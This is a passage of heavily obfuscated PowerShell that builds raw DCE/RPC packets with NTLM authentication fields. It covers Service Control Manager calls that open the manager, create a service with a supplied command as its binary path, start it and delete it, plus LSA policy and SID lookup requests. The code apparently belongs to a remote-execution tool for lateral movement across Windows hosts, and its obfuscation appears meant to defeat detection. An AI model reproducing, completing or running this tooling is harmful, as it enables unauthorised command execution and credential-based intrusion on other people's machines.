        ${R`P`cbind}.("{1}{0}"-f'd','Ad').Invoke(("{0}{1}{2}" -f 'Interf','a','ceVer'),${UuiD`Vers`ion})
        ${r`pCBINd}.("{0}{1}"-f 'A','dd').Invoke(("{3}{1}{0}{4}{2}" -f'ceV','fa','or','Inter','erMin'),[Byte[]](0x00,0x00))
        ${rpC`BI`ND}.("{1}{0}"-f 'd','Ad').Invoke(("{1}{4}{2}{3}{0}"-f 'x','Trans','rSy','nta','fe'),[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
        ${R`Pcbind}.("{1}{0}" -f 'dd','A').Invoke(("{3}{1}{0}{4}{2}" -f'y','sferS','Ver','Tran','ntax'),[Byte[]](0x02,0x00,0x00,0x00))
    
        if(${NUmcT`x`ITems}[0] -eq 2)
        {
            ${R`PCBInD}.("{1}{0}"-f 'dd','A').Invoke(("{3}{2}{0}{1}" -f'xtI','D2','onte','C'),[Byte[]](0x01,0x00))
            ${rpC`B`IND}.("{0}{1}"-f'Ad','d').Invoke(("{2}{1}{0}{3}{4}"-f'ansIte','mTr','Nu','ms','2'),[Byte[]](0x01))
            ${rPc`Bi`ND}.("{0}{1}"-f'A','dd').Invoke(("{2}{1}{0}" -f 'own3','n','Unk'),[Byte[]](0x00))
            ${rpC`Bi`Nd}.("{1}{0}"-f'dd','A').Invoke(("{0}{1}{3}{2}"-f'I','n','erface2','t'),${U`UID})
            ${r`pcbI`ND}.("{0}{1}"-f'A','dd').Invoke(("{2}{1}{0}" -f '2','nterfaceVer','I'),${u`U`IdvERsIOn})
            ${RpC`B`ind}.("{1}{0}" -f'dd','A').Invoke(("{1}{0}{2}{3}{4}"-f'rface','Inte','VerMi','no','r2'),[Byte[]](0x00,0x00))
            ${r`PcB`iND}.("{0}{1}"-f'A','dd').Invoke(("{0}{1}{3}{2}"-f 'T','ransf','yntax2','erS'),[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            ${RPc`B`InD}.("{0}{1}" -f'Ad','d').Invoke(("{2}{1}{3}{0}{4}" -f 'nt','nsfe','Tra','rSy','axVer2'),[Byte[]](0x01,0x00,0x00,0x00))
        }
        elseif(${Nu`mct`XitE`MS}[0] -eq 3)
        {
            ${rpC`Bi`ND}.("{0}{1}" -f'A','dd').Invoke(("{1}{2}{0}"-f'ID2','Co','ntext'),[Byte[]](0x01,0x00))
            ${RPC`B`Ind}.("{1}{0}"-f'dd','A').Invoke(("{1}{3}{2}{0}"-f '2','NumTr','ms','ansIte'),[Byte[]](0x01))
            ${rp`cB`InD}.("{1}{0}"-f'dd','A').Invoke(("{1}{0}{2}"-f 'own','Unkn','3'),[Byte[]](0x00))
            ${RPC`B`IND}.("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{1}" -f'Interfa','2','ce'),${Uu`iD})
            ${rpcb`i`Nd}.("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{1}" -f'Int','faceVer2','er'),${uU`id`VErS`iOn})
            ${R`PC`BiNd}.("{1}{0}"-f'dd','A').Invoke(("{3}{4}{2}{1}{0}"-f'or2','ceVerMin','a','Inter','f'),[Byte[]](0x00,0x00))
            ${RPC`B`inD}.("{0}{1}"-f 'A','dd').Invoke(("{3}{1}{0}{2}" -f'rS','e','yntax2','Transf'),[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
            ${RP`Cbind}.("{1}{0}"-f 'dd','A').Invoke(("{0}{5}{1}{4}{3}{2}" -f 'Tr','n','taxVer2','ferSyn','s','a'),[Byte[]](0x01,0x00,0x00,0x00))
            ${RP`cb`INd}.("{0}{1}" -f'Ad','d').Invoke(("{0}{1}{2}" -f 'Cont','ex','tID3'),[Byte[]](0x02,0x00))
            ${rPc`BI`ND}.("{0}{1}"-f 'A','dd').Invoke(("{2}{3}{4}{1}{0}" -f '3','tems','NumT','rans','I'),[Byte[]](0x01))
            ${RP`c`BinD}.("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}" -f 'Unknow','n4'),[Byte[]](0x00))
            ${rpCB`InD}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{0}"-f'3','Int','erface'),${u`UiD})
            ${rpCB`I`ND}.("{0}{1}" -f'A','dd').Invoke(("{2}{0}{1}" -f 'n','terfaceVer3','I'),${uU`IDvER`s`IOn})
            ${r`pCb`InD}.("{0}{1}"-f 'Ad','d').Invoke(("{4}{2}{0}{3}{1}"-f'V','r3','terface','erMino','In'),[Byte[]](0x00,0x00))
            ${rpc`Bi`ND}.("{1}{0}"-f'dd','A').Invoke(("{2}{1}{0}"-f 'ntax3','ferSy','Trans'),[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            ${R`pCB`Ind}.("{0}{1}"-f 'Ad','d').Invoke(("{4}{3}{0}{1}{2}"-f'ta','xV','er3','ferSyn','Trans'),[Byte[]](0x01,0x00,0x00,0x00))
        }
    
        if(${CALL`_`iD} -eq 3)
        {
            ${R`pC`BInD}.("{1}{0}" -f 'dd','A').Invoke(("{0}{2}{1}" -f'A','thType','u'),[Byte[]](0x0a))
            ${rpc`BI`Nd}.("{1}{0}" -f'dd','A').Invoke(("{1}{2}{0}"-f 'l','A','uthLeve'),[Byte[]](0x02))
            ${RpCB`iND}.("{0}{1}" -f 'Ad','d').Invoke(("{2}{1}{0}"-f 'h','hPadLengt','Aut'),[Byte[]](0x00))
            ${RPCB`I`Nd}.("{1}{0}" -f'dd','A').Invoke(("{2}{0}{1}{3}"-f 'thRe','se','Au','rved'),[Byte[]](0x00))
            ${r`pC`BInD}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}{2}" -f'ontextI','C','D3'),[Byte[]](0x00,0x00,0x00,0x00))
            ${RPcb`I`ND}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{1}{0}{3}"-f 'en','d','I','tifier'),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            ${r`P`cBInd}.("{0}{1}" -f'A','dd').Invoke(("{1}{2}{3}{0}"-f'Type','Mess','ag','e'),[Byte[]](0x01,0x00,0x00,0x00))
            ${RP`C`BinD}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{0}" -f 's','N','egotiateFlag'),[Byte[]](0x97,0x82,0x08,0xe2))
            ${R`PCBInd}.("{0}{1}"-f'A','dd').Invoke(("{3}{4}{2}{1}{0}"-f'in','a','om','CallingW','orkstationD'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            ${rPcB`I`Nd}.("{1}{0}" -f 'd','Ad').Invoke(("{6}{3}{5}{0}{2}{1}{4}" -f'st','ion','at','allingWo','Name','rk','C'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            ${R`pcbI`ND}.("{0}{1}"-f'A','dd').Invoke(("{0}{1}"-f 'OSVer','sion'),[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }
    
        return ${rPCb`I`ND}
    }
    
    function N`eW-P`Ac`k`E`TRPCrEqUest
    {
        param([Byte[]]${fla`gs},[Int]${SER`ViCELEng`Th},[Int]${Aut`HL`ENgth},[Int]${au`ThpAd`DInG},[Byte[]]${CAl`LiD},[Byte[]]${co`NTeX`TId},[Byte[]]${O`PN`UM},[Byte[]]${Da`TA})
    
        if(${A`U`ThLeN`gTh} -gt 0)
        {
            ${fu`L`L_A`U`T`h_LEnGTh} = ${au`TH`LenGtH} + ${AUThPA`DdI`Ng} + 8
        }
    
        [Byte[]]${wRi`Te_leNg`TH} =   (  d`IR  VarIAble:xV8QNB).valUe::("{0}{1}{2}" -f'GetB','yte','s').Invoke(${s`ERVicELeng`Th} + 24 + ${Fu`LL`_`A`UtH_LEngTH} + ${D`ATA}."lE`NgtH")
        [Byte[]]${FR`AG_`L`eNgth} = ${WrItE`_lEN`G`TH}[0,1]
        [Byte[]]${alLO`C`_hInt} =  (get-ChIl`Dit`em  vARiable:XV8QnB ).Value::("{0}{1}{2}"-f'Ge','tByte','s').Invoke(${SERvi`cE`Leng`Th} + ${Da`Ta}."L`eNGth")
        [Byte[]]${AuT`H`_leNg`Th} = ( $XV8qnb::("{2}{0}{1}" -f'etByte','s','G').Invoke(${auTHL`e`N`gTh}))[0,1]
    
        ${r`pCre`Que`St} = N`e`W-oB`jeCT ("{8}{2}{7}{3}{9}{6}{5}{4}{0}{11}{10}{12}{1}" -f'alized','y','s','.','ci','.Spe','lections','tem','Sy','Col','dD','.Ordere','ictionar')
        ${r`p`creQuEsT}.("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{2}"-f 's','Ver','ion'),[Byte[]](0x05))
        ${rPcREQU`e`ST}.("{1}{0}"-f'd','Ad').Invoke(("{2}{0}{1}"-f'onMi','nor','Versi'),[Byte[]](0x00))
        ${r`PCrE`QuE`sT}.("{0}{1}"-f'Ad','d').Invoke(("{2}{1}{0}"-f'ype','acketT','P'),[Byte[]](0x00))
        ${r`p`CReqUEsT}.("{0}{1}" -f'A','dd').Invoke(("{3}{0}{2}{1}" -f'Fla','s','g','Packet'),${f`La`gS})
        ${rP`CReQ`UeSt}.("{1}{0}"-f'dd','A').Invoke(("{2}{0}{3}{4}{1}"-f'a','on','D','taReprese','ntati'),[Byte[]](0x10,0x00,0x00,0x00))
        ${R`Pc`ReQuest}.("{1}{0}"-f'dd','A').Invoke(("{0}{2}{1}{3}"-f'Fra','L','g','ength'),${frAG_l`eng`Th})
        ${R`PcrEqU`esT}.("{0}{1}" -f 'A','dd').Invoke(("{0}{1}{2}"-f 'A','uthLengt','h'),${A`UT`h_`leNGTH})
        ${RP`CREq`UeST}.("{0}{1}"-f'Ad','d').Invoke(("{0}{1}" -f 'Ca','llID'),${c`ALl`ID})
        ${Rp`cRE`QUE`St}.("{0}{1}" -f'Ad','d').Invoke(("{1}{0}{2}" -f'lo','Al','cHint'),${A`lloc`_`Hint})
        ${RpCRe`qU`e`st}.("{1}{0}"-f'dd','A').Invoke(("{1}{0}"-f 'xtID','Conte'),${Con`TE`xtiD})
        ${R`p`crEQu`eST}.("{1}{0}"-f'dd','A').Invoke(("{0}{1}"-f'Opn','um'),${o`Pn`Um})
    
        if(${da`TA}."L`eNgTH")
        {
            ${r`pCR`e`QUeST}.("{1}{0}"-f'd','Ad').Invoke(("{0}{1}"-f 'D','ata'),${dA`Ta})
        }
    
        return ${RPCr`eQU`EST}
    }

    

    function N`Ew-`pA`Ck`eTsCMOp`en`Scm`AnAgeRw
    {
        param ([Byte[]]${p`AcK`eT_sE`RvI`CE},[Byte[]]${Pa`ckeT_se`R`V`ic`e_lE`NgtH})
    
        ${Pa`c`keT_refe`RENt_`Id1} = [String](1..2 | fO`REAc`h-Ob`Je`ct {"{0:X2}" -f (Ge`T-rAn`DOM -Minimum 1 -Maximum 255)})
        ${PaC`KE`T_Re`Fe`REnt_`I`D1} = ${PACKEt`_`ReFEREn`T_`ID1}.("{1}{0}" -f'plit','S').Invoke(" ") | fOre`AcH-`OB`JECt{[Char]  (gi  ("VA"+"r"+"IabLE:4"+"vxN") ).vaLue::("{1}{0}"-f 'nt16','ToI').Invoke(${_},16)}
        ${pAcK`Et`_rEfERent_`I`d1} += 0x00,0x00
        ${pA`Cket_r`Ef`eRe`Nt_`Id2} = [String](1..2 | ForeAcH`-`objECT {"{0:X2}" -f (g`eT-Ran`dom -Minimum 1 -Maximum 255)})
        ${paCKEt_RE`FerE`N`T_i`d2} = ${p`A`CkET`_rEf`ERENt`_ID2}.("{0}{1}" -f 'Sp','lit').Invoke(" ") | FOrEA`C`H-`O`BJecT{[Char] (get-`cHiL`DI`T`em ("v"+"ArIaBlE:4V"+"x"+"N") ).vAluE::("{0}{1}"-f 'ToInt1','6').Invoke(${_},16)}
        ${pAck`et_`R`eFeRe`Nt_i`D2} += 0x00,0x00
    
        ${pac`Ket_SCMoPeNscmA`N`A`GeRW} = nE`W-`ObJECt ("{1}{3}{0}{8}{4}{2}{5}{11}{9}{6}{7}{10}"-f'tem.Collecti','S','ec','ys','ns.Sp','ialize','tio','nar','o','OrderedDic','y','d.')
        ${packEt_scmOP`e`NsCmaN`A`geRw}.("{1}{0}"-f'd','Ad').Invoke(("{0}{3}{1}{4}{2}"-f 'Machi','eName_Refe','entID','n','r'),${paC`ke`T_r`EFeRE`N`T_ID1})
        ${P`AC`KEt_scmo`PeN`Scm`AN`AgE`Rw}.("{0}{1}"-f 'A','dd').Invoke(("{3}{4}{2}{0}{1}" -f'eName_','MaxCount','n','Mac','hi'),${paCK`e`T_Ser`V`i`Ce_LeNgTH})
        ${P`AckEt_`SCMopE`Ns`CM`AN`AGERW}.("{0}{1}" -f'A','dd').Invoke(("{2}{4}{0}{3}{5}{1}" -f'h','t','M','ine','ac','Name_Offse'),[Byte[]](0x00,0x00,0x00,0x00))
        ${PA`CKE`T_s`Cmop`Ensc`MAnAgE`Rw}.("{0}{1}"-f'Ad','d').Invoke(("{3}{1}{0}{2}" -f 'tualCoun','chineName_Ac','t','Ma'),${paCKeT`_`SERViCE`_`LEnGth})
        ${pAck`Et_S`cM`O`pENSCmANaGERw}.("{0}{1}" -f'Ad','d').Invoke(("{2}{1}{0}" -f'me','Na','Machine'),${pa`CKet_`S`ERV`ICE})
        ${PAckeT`_SCM`o`Pen`sc`MANaGerW}.("{1}{0}" -f'd','Ad').Invoke(("{2}{0}{1}{3}" -f 'atabase_Re','feren','D','tID'),${PaC`Ke`T_rEF`e`ReNT_i`D2})
        ${p`Ac`keT_sC`MOPEnSCm`AnAgerw}.("{0}{1}" -f 'A','dd').Invoke(("{3}{0}{1}{2}" -f 'se_NameMa','xCou','nt','Databa'),[Byte[]](0x0f,0x00,0x00,0x00))
        ${Pac`keT`_`S`cmOpEns`cmAnaGErW}.("{0}{1}"-f'A','dd').Invoke(("{2}{1}{3}{5}{4}{0}" -f 'Offset','b','Data','a','e_Name','s'),[Byte[]](0x00,0x00,0x00,0x00))
        ${PAc`k`E`T_sCmoPEn`S`cmANAGERw}.("{1}{0}"-f 'dd','A').Invoke(("{5}{0}{2}{1}{4}{3}" -f'at','e_','abas','ualCount','NameAct','D'),[Byte[]](0x0f,0x00,0x00,0x00))
        ${p`Ac`K`ET_ScmOPe`NsCMA`NAGE`RW}.("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{1}"-f 'Data','e','bas'),[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
        ${Pa`ckET`_`ScmopeN`Sc`Man`AgERw}.("{0}{1}" -f 'A','dd').Invoke(("{2}{0}{1}"-f 'now','n','Unk'),[Byte[]](0xbf,0xbf))
        ${PaC`kE`T_ScMoPen`s`CMAnaGerw}.("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{1}" -f'A','ssMask','cce'),[Byte[]](0x3f,0x00,0x00,0x00))
        
        return ${PaC`KEt`_SCMoPe`NScmanaG`erw}
    }
    
    function n`eW-Pac`KEtSc`mC`R`E`ATE`seRvICEw
    {
        param([Byte[]]${c`ontextH`ANDLe},[Byte[]]${SE`RVI`CE},[Byte[]]${S`ERvi`c`E`LEnGtH},[Byte[]]${Com`mANd},[Byte[]]${com`Ma`Nd`LEN`gth})
                    
        ${Re`FErE`Nt_iD} = [String](1..2 | FoRe`ACH-`obj`eCt {"{0:X2}" -f (Ge`T`-rAnDom -Minimum 1 -Maximum 255)})
        ${REFeR`E`NT_`id} = ${R`efereNT`_`Id}.("{1}{0}"-f 'lit','Sp').Invoke(" ") | FO`ReA`cH-ObJe`cT{[Char]  $4vxN::("{0}{1}" -f'ToI','nt16').Invoke(${_},16)}
        ${rE`FeR`EnT`_iD} += 0x00,0x00
    
        ${ScM`cRE`At`eservI`Cew} = nEw`-O`BJ`ect ("{12}{2}{0}{3}{10}{1}{5}{11}{7}{9}{6}{4}{13}{8}"-f'lections.S','iz','m.Col','pecia','edDicti','e','r','.Ord','y','e','l','d','Syste','onar')
        ${sCm`CREAtes`e`RVIcEW}.("{1}{0}"-f'd','Ad').Invoke(("{1}{0}{2}" -f'ontextHandl','C','e'),${CO`Nt`ExthaNd`LE})
        ${s`cm`CREA`TE`SeRvicew}.("{1}{0}" -f 'dd','A').Invoke(("{5}{1}{2}{0}{3}{4}"-f'_M','er','viceName','a','xCount','S'),${serVI`Ce`l`En`Gth})
        ${scmCr`E`Ate`SER`Vi`CeW}.("{0}{1}" -f'A','dd').Invoke(("{2}{0}{3}{4}{1}" -f'ce','_Offset','Servi','N','ame'),[Byte[]](0x00,0x00,0x00,0x00))
        ${SC`M`Cr`eatESEr`VICEw}.("{1}{0}"-f'd','Ad').Invoke(("{5}{1}{0}{2}{3}{4}{6}" -f 'ic','v','eNam','e_A','ctualCou','Ser','nt'),${se`RvICE`LEn`g`Th})
        ${scM`C`ReaTESe`RVIceW}.("{0}{1}"-f'Ad','d').Invoke(("{1}{3}{2}{0}"-f 'eName','S','rvic','e'),${SEr`VI`cE})
        ${s`c`mCrEaTeseR`VICeW}.("{0}{1}" -f'Ad','d').Invoke(("{5}{4}{6}{3}{1}{2}{0}" -f'erentID','R','ef','ame_','ispla','D','yN'),${re`Feren`T_`ID})
        ${s`C`MCRe`ATEsER`Vi`Cew}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{4}{0}{2}{3}" -f'layName_','Dis','MaxC','ount','p'),${SeRvi`ce`lEnGtH})
        ${S`C`MCRe`ATEsErViCew}.("{1}{0}"-f'dd','A').Invoke(("{3}{1}{4}{2}{5}{0}"-f 'Offset','i','lay','D','sp','Name_'),[Byte[]](0x00,0x00,0x00,0x00))
        ${Scmc`REAte`sERvIC`ew}.("{0}{1}"-f 'Ad','d').Invoke(("{5}{1}{0}{4}{3}{2}" -f'ct','A','ount','lC','ua','DisplayName_'),${sEr`VIC`E`L`EnGtH})
        ${sCmCR`EA`TEs`ERVicew}.("{1}{0}" -f 'd','Ad').Invoke(("{3}{1}{2}{0}"-f 'e','layN','am','Disp'),${SErVi`Ce})
        ${sCmc`R`eaT`EsERvi`CEw}.("{1}{0}"-f'dd','A').Invoke(("{0}{1}{2}" -f 'Acces','sMas','k'),[Byte[]](0xff,0x01,0x0f,0x00))
        ${Sc`McR`E`AtEs`ErvIc`ew}.("{1}{0}"-f 'dd','A').Invoke(("{2}{1}{0}"-f'ceType','ervi','S'),[Byte[]](0x10,0x00,0x00,0x00))
        ${S`cm`CRea`TeservIcew}.("{0}{1}"-f 'Ad','d').Invoke(("{2}{0}{1}{5}{4}{3}"-f 'er','viceStar','S','pe','y','tT'),[Byte[]](0x03,0x00,0x00,0x00))
        ${SCmcRe`ATEs`E`RvIcEW}.("{1}{0}"-f 'dd','A').Invoke(("{0}{1}{4}{2}{3}"-f 'Se','rviceErrorCo','ro','l','nt'),[Byte[]](0x00,0x00,0x00,0x00))
        ${sCm`creat`ESE`RVic`ew}.("{1}{0}"-f'dd','A').Invoke(("{4}{2}{5}{3}{0}{1}" -f'o','unt','ar','athName_MaxC','Bin','yP'),${cOm`m`AnDLeNG`TH})
        ${s`cMcREA`T`eSer`ViCEW}.("{0}{1}"-f 'A','dd').Invoke(("{4}{2}{3}{0}{1}{5}" -f'N','am','ary','Path','Bin','e_Offset'),[Byte[]](0x00,0x00,0x00,0x00))
        ${SCmCrE`A`Te`SErVICEw}.("{0}{1}"-f 'Ad','d').Invoke(("{5}{4}{3}{1}{2}{0}" -f 'tualCount','hName_A','c','Pat','nary','Bi'),${cOm`Man`dlEn`Gth})
        ${SCMc`ReA`Te`S`erVIc`eW}.("{0}{1}"-f'A','dd').Invoke(("{3}{0}{1}{2}"-f't','hN','ame','BinaryPa'),${C`Om`MANd})
        ${SCmC`Re`AT`eServ`IC`Ew}.("{0}{1}" -f 'A','dd').Invoke(("{3}{0}{2}{1}" -f'LL','er','Point','NU'),[Byte[]](0x00,0x00,0x00,0x00))
        ${S`cM`cre`AtES`ervIcew}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{0}" -f'ID','Tag'),[Byte[]](0x00,0x00,0x00,0x00))
        ${sC`mcReAtESe`R`VI`c`EW}.("{1}{0}" -f 'dd','A').Invoke(("{0}{2}{3}{1}"-f 'NULL','nter2','P','oi'),[Byte[]](0x00,0x00,0x00,0x00))
        ${SC`MC`REA`T`EsE`RvICEw}.("{1}{0}" -f'd','Ad').Invoke(("{1}{2}{0}"-f 'ze','Depe','ndSi'),[Byte[]](0x00,0x00,0x00,0x00))
        ${SCMCrEa`T`ESER`VIcEw}.("{0}{1}" -f'A','dd').Invoke(("{1}{3}{0}{2}"-f'Po','N','inter3','ULL'),[Byte[]](0x00,0x00,0x00,0x00))
        ${sc`Mc`REAteSeRV`I`ceW}.("{1}{0}" -f'dd','A').Invoke(("{3}{1}{2}{0}"-f 'er4','ULLPoi','nt','N'),[Byte[]](0x00,0x00,0x00,0x00))
        ${scmcReAT`E`sE`RvI`CEW}.("{1}{0}"-f 'd','Ad').Invoke(("{2}{1}{0}{3}" -f 'rdSi','o','Passw','ze'),[Byte[]](0x00,0x00,0x00,0x00))
    
        return ${S`CmCreaT`es`erV`icEw}
    }
    
    function n`eW-`PaCk`eT`SC`MSTaRts`erVi`C`eW
    {
        param([Byte[]]${C`o`NTEx`THAndle})
    
        ${S`Cm`StAR`TseRvI`CEW} = n`Ew-obJ`eCt ("{9}{1}{5}{0}{11}{7}{3}{10}{2}{6}{4}{8}"-f'i','stem.Col','l','eci','dere','lect','ized.Or','.Sp','dDictionary','Sy','a','ons')
        ${SCmST`ArT`SeRvi`c`ew}.("{0}{1}" -f'A','dd').Invoke(("{2}{1}{0}"-f'dle','xtHan','Conte'),${Co`N`TEXtH`AnDle})
        ${SCM`sT`A`Rt`SERV`iceW}.("{1}{0}" -f'd','Ad').Invoke(("{1}{0}" -f 'nknown','U'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    
        return ${Sc`mStar`T`sErvI`Cew}
    }
    
    function n`Ew-PaCkE`TsC`mDel`e`TESErvICew
    {
        param([Byte[]]${C`OnT`eXTHa`NDlE})
    
        ${S`cMDELETEser`ViC`ew} = N`EW-`oBJECT ("{11}{4}{0}{2}{13}{12}{14}{10}{1}{6}{3}{5}{9}{7}{8}" -f'te','d.O','m','i','ys','cti','rderedD','n','ary','o','s.Specialize','S','c','.Colle','tion')
        ${sc`mdel`ETes`ERviCew}.("{0}{1}" -f'A','dd').Invoke(("{2}{0}{1}" -f 'textHandl','e','Con'),${ContexT`haN`dlE})
    
        return ${s`cmDeLeTe`s`ERVICEw}
    }
    
    function NeW`-p`Acke`TSCm`cLO`seSEr`Vi`cehAnDlE
    {
        param([Byte[]]${C`OnTeXt`HA`NDLe})
    
        ${sc`m`_cLosEs`eRVi`CeW} = N`eW`-ObjECt ("{0}{6}{2}{7}{1}{3}{8}{4}{5}" -f'Syste','ns.Special','l','iz','dered','Dictionary','m.Col','ectio','ed.Or')
        ${s`cm_`cLOsesE`RVi`ceW}.("{0}{1}" -f 'A','dd').Invoke(("{1}{0}{2}" -f'extHa','Cont','ndle'),${C`ON`Te`XtHAN`dle})
    
        return ${s`Cm`_ClOSes`e`RVicew}
    }

    
function NEw-`p`AcKE`T`l`SAoPen`PoLIcy
{
    ${L`sa`oPeNPoLiCy} = NEW`-O`B`JeCt ("{9}{6}{7}{5}{3}{0}{2}{8}{4}{1}"-f 'ict','y','i','eredD','r','ollections.Specialized.Ord','tem','.C','ona','Sys')
    ${L`sAopENPolI`Cy}.("{1}{0}"-f'd','Ad').Invoke(("{2}{0}{3}{1}{4}{6}{5}"-f 'i','erToS','Po','nt','ys','emName_ReferentID','t'),[Byte[]](0x00,0x00,0x02,0x00))
    ${lsao`PEnpOl`I`cy}.("{1}{0}"-f'dd','A').Invoke(("{6}{2}{3}{0}{1}{5}{4}" -f'em','N','rToSys','t','tem','ame_Sys','Pointe'),[Byte[]](0x5c,0x00))
    ${LS`A`OPEnpoLi`Cy}.("{1}{0}" -f'dd','A').Invoke(("{6}{0}{2}{3}{5}{4}{7}{1}" -f'o','own','in','te','oSystemName_Un','rT','P','kn'),[Byte[]](0x00,0x00))
    ${L`Sao`PenP`OLI`Cy}.("{1}{0}"-f'dd','A').Invoke(("{2}{5}{1}{6}{3}{0}{4}" -f 'Attr_','t','Poi','r_','Len','nterToA','t'),[Byte[]](0x18,0x00,0x00,0x00))
    ${L`S`AOPenp`oLiCY}.("{1}{0}" -f'd','Ad').Invoke(("{5}{0}{2}{3}{1}{4}"-f 'rToAttr','t','_At','tr_NullPoin','er','Pointe'),[Byte[]](0x00,0x00,0x00,0x00))
    ${lSAO`pE`N`PoLICy}.("{0}{1}"-f'A','dd').Invoke(("{0}{5}{2}{3}{7}{1}{4}{6}"-f 'Point','ullPoint','tr_A','ttr_','e','erToAt','r2','N'),[Byte[]](0x00,0x00,0x00,0x00))
    ${lSaO`p`EnpoLIcy}.("{0}{1}"-f 'A','dd').Invoke(("{6}{2}{7}{5}{1}{4}{0}{3}"-f'i','_','n','butes','Attr_Attr','ttr','Poi','terToA'),[Byte[]](0x00,0x00,0x00,0x00))
    ${L`S`AoPe`NpO`liCy}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{5}{3}{4}{1}{2}" -f'Poi','_Attr_NullPoin','ter3','erToA','ttr','nt'),[Byte[]](0x00,0x00,0x00,0x00))
    ${L`saOpe`N`POliCY}.("{1}{0}"-f'd','Ad').Invoke(("{6}{7}{0}{5}{2}{8}{4}{1}{3}" -f 'oAt','_Refe','Attr_Poi','rentID','SecQos','tr_','Poi','nterT','nterTo'),[Byte[]](0x04,0x00,0x02,0x00))
    ${ls`AOpEnpo`l`i`Cy}.("{1}{0}"-f'dd','A').Invoke(("{2}{4}{0}{5}{3}{6}{1}" -f 'r_Point','n','Poi','L','nterToAttr_Att','erToSecQos_Qos_','e'),[Byte[]](0x0c,0x00,0x00,0x00))
    ${lsA`Op`E`N`POliCY}.("{0}{1}" -f 'A','dd').Invoke(("{8}{5}{6}{12}{2}{3}{4}{10}{0}{9}{7}{11}{1}" -f 'ecQ','nLevel','Att','r_Po','inte','r','T','na','Pointe','os_Imperso','rToS','tio','oAttr_'),[Byte[]](0x02,0x00))
    ${l`s`AoPeN`PoLi`cy}.("{1}{0}" -f 'd','Ad').Invoke(("{7}{8}{2}{10}{1}{11}{3}{4}{9}{5}{6}{13}{12}{0}" -f 'ntextMode','r','nte','At','tr','nterToSe','c','P','oi','_Poi','rToAtt','_','s_Co','Qo'),[Byte[]](0x01))
    ${L`s`AO`PenP`OliCY}.("{1}{0}"-f 'd','Ad').Invoke(("{8}{9}{2}{1}{0}{4}{7}{6}{5}{3}"-f 'erToSec','ToAttr_Attr_Point','r','ly','Qos_Eff','n','iveO','ect','Po','inte'),[Byte[]](0x00))
    ${lsA`oPeN`P`OLi`CY}.("{1}{0}"-f 'dd','A').Invoke(("{0}{2}{1}" -f 'A','k','ccessMas'),[Byte[]](0x00,0x00,0x00,0x02))

    return ${LsaOpenp`Ol`I`cY}
}

function NE`w`-`paCk`eTlsa`q`U`ERyinFopO`LICy
{
    param([Byte[]]${h`AnD`lE})

    ${Lsa`que`RyinFop`olI`Cy} = NE`w-o`B`jeCT ("{1}{2}{7}{0}{8}{10}{9}{4}{6}{3}{5}" -f'io','S','ystem.Colle','d','c','eredDictionary','ialized.Or','ct','n','Spe','s.')
    ${ls`AqUE`RY`InFopO`L`ICY}.("{0}{1}" -f'A','dd').Invoke(("{0}{1}{4}{2}{3}" -f'Po','in','and','le','terToH'),${ha`ND`Le})
    ${LS`AquE`R`yinFoPol`I`CY}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}"-f 'Le','vel'),[Byte[]](0x05,0x00))

    return ${LS`A`QUERYIn`FopolI`cY}
}

function New`-`pAcketLSAcL`osE
{
    param([Byte[]]${hAnd`lE})

    ${Ls`A`cl`oSE} = NEw-o`B`Ject ("{6}{5}{2}{3}{0}{4}{9}{10}{8}{1}{7}" -f 's.Sp','io','ecti','on','ecial','m.Coll','Syste','nary','edDict','ized.Orde','r')
    ${ls`A`CLo`SE}.("{1}{0}" -f'dd','A').Invoke(("{1}{0}{2}"-f 'nterToHan','Poi','dle'),${ha`Nd`LE})

    return ${lS`A`ClOse}
}

function NEW-`Pac`KEt`lsAlo`O`kuP`SIDS
{
    param([Byte[]]${HA`NdlE},[Byte[]]${SiDa`R`RAy})

    ${Ls`AloO`kuPS`IdS} = NE`w-OBJ`ecT ("{1}{4}{10}{5}{11}{8}{6}{0}{9}{3}{12}{2}{7}"-f 'Speciali','S','tion','ed','ystem.C','lle','s.','ary','tion','z','o','c','.OrderedDic')
    ${l`sA`Look`UPSIdS}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{3}{2}{1}"-f 'Poin','Handle','erTo','t'),${HaN`d`lE})
    ${lS`AlO`OkU`p`sids}.("{1}{0}" -f 'd','Ad').Invoke(("{4}{0}{5}{3}{2}{6}{1}" -f 'erT','IDArray','s','ID','Point','oS','_S'),${SiD`A`RRaY})
    ${LSAlo`O`kup`S`iDS}.("{1}{0}"-f 'd','Ad').Invoke(("{4}{0}{5}{1}{3}{2}"-f'oi','e','nt','s_cou','P','nterToNam'),[Byte[]](0x00,0x00,0x00,0x00))
